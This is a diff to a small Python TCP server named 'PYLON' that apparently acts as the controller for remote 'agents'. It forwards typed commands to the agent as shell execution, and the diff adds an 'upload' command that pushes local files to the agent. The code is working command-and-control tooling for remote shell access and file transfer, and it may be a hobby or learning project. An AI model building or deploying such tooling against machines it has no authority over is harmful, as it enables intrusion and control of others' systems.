@@ -1,5 +1,6 @@
 import socket
 import struct 
+import os 
 
 HOST = '127.0.0.1'
 PORT = 9001
@@ -17,7 +18,7 @@ def handle_agent(conn, addr):
     print(f"Connection: {addr}")
     print("Exit - close program")
     print("drop - disconnect agent, allow he to reconnect")
-    
+    print("upload <path>, download <path>")
     print("==== PYLON ====")
     
     try:
@@ -36,7 +37,34 @@ def handle_agent(conn, addr):
             if cmd == 'drop':
                 print('Disconnecting agent')
                 break
-
+            
+            if cmd.startswith("upload "):
+                try:
+                    local_path = cmd.split(" ", 1)[1]
+                    if not os.path.exists(local_path):
+                        print("ERROR: File not found")
+                        continue
+                    
+                    filename = os.path.basename(local_path)
+                    filename_bytes = filename.encode('utf-8')
+                    
+                    with open(local_path, "rb") as f:
+                        file_bytes = f.read()
+                    
+                    payload = struct.pack("!I", len(filename_bytes)) + filename_bytes + file_bytes
+                    header = struct.pack("!II", 2, len(payload))
+                    
+                    conn.sendall(header + payload)
+                    print(f"Sending '{filename}'")
+                    
+                    resp_h = receive_exact(conn, 8)
+                    r_id, r_len = struct.unpack("!II", resp_h)
+                    msg = receive_exact(conn, r_len).decode()
+                    print(f"Output: {msg}")
+                except Exception as e:
+                    print(f"Error: {e}")
+                continue
+                                                    
             payload = cmd.encode()
             header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
             conn.sendall(header + payload)
